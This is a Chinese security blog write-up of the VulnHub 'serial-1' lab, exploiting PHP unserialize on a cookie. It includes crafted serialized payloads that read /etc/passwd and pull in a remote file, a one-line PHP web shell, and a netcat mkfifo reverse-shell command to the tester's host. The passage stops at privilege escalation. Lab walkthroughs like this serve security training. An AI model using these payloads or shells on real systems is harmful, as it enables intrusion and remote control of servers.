---
title: 靶场攻略 | php反序列化靶机实战
url: https://www.secpulse.com/archives/196076.html
source: 安全脉搏
date: 2023-02-18
fetch_date: 2025-10-04T07:19:56.106916
---

# 靶场攻略 | php反序列化靶机实战

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# 靶场攻略 | php反序列化靶机实战

[脉搏文库](https://www.secpulse.com/archives/category/category/secdocs)

[贝塔安全实验室](https://www.secpulse.com/newpage/author?author_id=9525)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng0.png)

2023-02-17

8,136

本文作者：eth10（贝塔安全实验室-核心成员）

**0x01：****靶机下载地址**

https://www.vulnhub.com/entry/serial-1,349/，如何搭建靶机，请自行百度！

**0x02：****存活扫描**

```
请输入ip：192.168.25.0/24
请输入线程数(默认1000)：255
192.168.25.1
192.168.25.139
```

**0x03：****端口扫描**

```
请输入IP：192.168.25.139
请输入端口(默认常规端口)：
请输入线程数(默认1000)：
请设置超时时间(默认3秒)：
192.168.25.139:22
192.168.25.139:80

done: 0.05
退出 Press Enter
```

**0x04：****访问web服务**

页面只有一行文本Hello sk4This is a beta test for new cookie handler 通过bp截断看到如下数据包：

```
GET / HTTP/1.1
Host: 192.168.25.139
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: user=Tzo0OiJVc2VyIjoyOntzOjEwOiIAVXNlcgBuYW1lIjtzOjM6InNrNCI7czo5OiIAVXNlcgB3ZWwiO086NzoiV2VsY29tZSI6MDp7fX0%3D
Upgrade-Insecure-Requests: 1
```

## 返回包：

```
HTTP/1.1 200 OK
Date: Sun, 08 Sep 2019 12:41:42 GMT
Server: Apache/2.4.38 (Ubuntu)
Content-Length: 52
Connection: close
Content-Type: text/html; charset=UTF-8</small>

Hello sk4This is a beta test for new cookie handler
```

发现cookie进行了base64编码了，进行解码如下：

```
O:4:"User":2:{s:10:" User name";s:3:"sk4";s:9:" User wel";O:7:"Welcome":0:{}}
o：代表存储的是对象（object），如果传入的是一个数组，那它会变成字母a。
4：表示对象的名称有4个字符。User表示对象名称，刚好是4个字符。
2：表示有2个值
s：表示字符串，数字表示字符串的长度，s:10:" User name";
```

**思路一**

#### 逻辑漏洞绕过

将user换成admin，尝试能否绕过

```
O:4:"User":2:{s:10:" User name";s:5:"admin";s:9:" User wel";O:7:"Welcome":0:{}}
Tzo0OiJVc2VyIjoyOntzOjEwOiIgVXNlciBuYW1lIjtzOjU6ImFkbWluIjtzOjk6IiBVc2VyIHdlbCI7Tzo3OiJXZWxjb21lIjowOnt9fQ%3D%3D
```

结果出现错误

```
HTTP/1.0 500 Internal Server Error
Date: Sun, 08 Sep 2019 12:43:44 GMT
Server: Apache/2.4.38 (Ubuntu)
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8
```

**思路二**

**目录扫描**

进行目录扫描，查看是否有信息泄露或者后台管理页面通过目录扫描发现backup目录。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196076-1676625975.png)

访问发现服务器开启了目录索引功能，导致出现目录浏览漏洞，通过目录浏览功能可直接访问或下载相关文件！

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196076-16766259751.png)

对文件下载解压后发现三个源代码文件

```
C:Userseth10Documents靶机bak>dir /b
index.php
log.class.php
user.class.php
```

**代码审计**

```
C:Userseth10Documents靶机bak>cat index.php
<?php
        include("user.class.php");</small>

        if(!isset($_COOKIE['user'])) {
                setcookie("user", base64_encode(serialize(new User('sk4'))));
        } else {
                unserialize(base64_decode($_COOKIE['user']));
        }
        echo "This is a beta test for new cookie handlern";
?>

C:Userseth10Documents靶机bak>cat log.class.php
<?php
  class Log {
    private $type_log;

    function __costruct($hnd) {
      $this->$type_log = $hnd;
    }

    public function handler($val) {
      include($this->type_log);
      echo "LOG: " . $val;
    }
  }
?>

C:Userseth10Documents靶机bak>cat user.class.php
<?php
  include("log.class.php");

  class Welcome {
    public function handler($val) {
      echo "Hello " . $val;
    }
  }

  class User {
    private $name;
    private $wel;

    function __construct($name) {
      $this->name = $name;
      $this->wel = new Welcome();
    }

    function __destruct() {
      //echo "byen";
      $this->wel->handler($this->name);
    }
  }

?>
```

通过查看文件发现，index.php文件包含了user.class.php文件，对cookie中的user参数进行了序列化和base64编码；

user.class.php文件包含了log.class.php，并调用了handler函数log.class.php中的handler函数对变量$val进行了文件包含和输出

```
O:4:"User":2:{s:10:" User name";s:3:"sk4";s:9:" User wel";O:7:"Welcome":0:{}}</small>

O:4:"User":2:{s:10:" User name";s:5:"admin";s:9:" User wel";O:3:"Log":1:{s:13:" Log type_log";s:11:"/etc/passwd";}}

O:4:"User":2:{s:10:" User name";s:5:"admin";s:9:" User wel";O:3:"Log":1:{s:8:"type_log";s:25:"http://192.168.25.1/c.txt";}}
```

使用base64编码后一直不成功，通过对比发现base64存在一定的不同，需要进行修改空格使用x00替换，然后再进行编码读取/etc/passwd文件

```
base64.b64encode(b'O:4:"User":2:{s:10:"x00Userx00name";s:5:"admin";s:9:"x00Userx00wel";O:3:"Log":1:{s:8:"type_log";s:11:"/etc/passwd";}}')
b'Tzo0OiJVc2VyIjoyOntzOjEwOiIAVXNlcgBuYW1lIjtzOjU6ImFkbWluIjtzOjk6IgBVc2VyAHdlbCI7TzozOiJMb2ciOjE6e3M6ODoidHlwZV9sb2ciO3M6MTE6Ii9ldGMvcGFzc3dkIjt9fQ=='
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196076-1676625977.jpg)

**getshell**

```
>>> 'O:4:"User":2:{s:10:" User name";s:5:"admin";s:9:" User wel";O:3:"Log":1:{s:8:"type_log";s:25:"http://192.168.25.1/c.txt";}}'.replace(' ','x00')
'O:4:"User":2:{s:10:"x00Userx00name";s:5:"admin";s:9:"x00Userx00wel";O:3:"Log":1:{s:8:"type_log";s:25:"http://192.168.25.1/c.txt";}}'
>>> base64.b64encode(b'O:4:"User":2:{s:10:"x00Userx00name";s:5:"admin";s:9:"x00Userx00wel";O:3:"Log":1:{s:8:"type_log";s:25:"http://192.168.25.1/c.txt";}}')
b'Tzo0OiJVc2VyIjoyOntzOjEwOiIAVXNlcgBuYW1lIjtzOjU6ImFkbWluIjtzOjk6IgBVc2VyAHdlbCI7TzozOiJMb2ciOjE6e3M6ODoidHlwZV9sb2ciO3M6MjU6Imh0dHA6Ly8xOTIuMTY4LjI1LjEvYy50eHQiO319'
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196076-1676625980.jpg)

c.txt文件内容：

> <?phpsystem($\_GET['cmd']);?>

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196076-1676625980.png)

**反弹shell**

```
rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+192.168.25.1+4444+>/tmp/f
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196076-1676625982.jpg)

****0x05：**提权**

**信息收集**

查看系统信息，...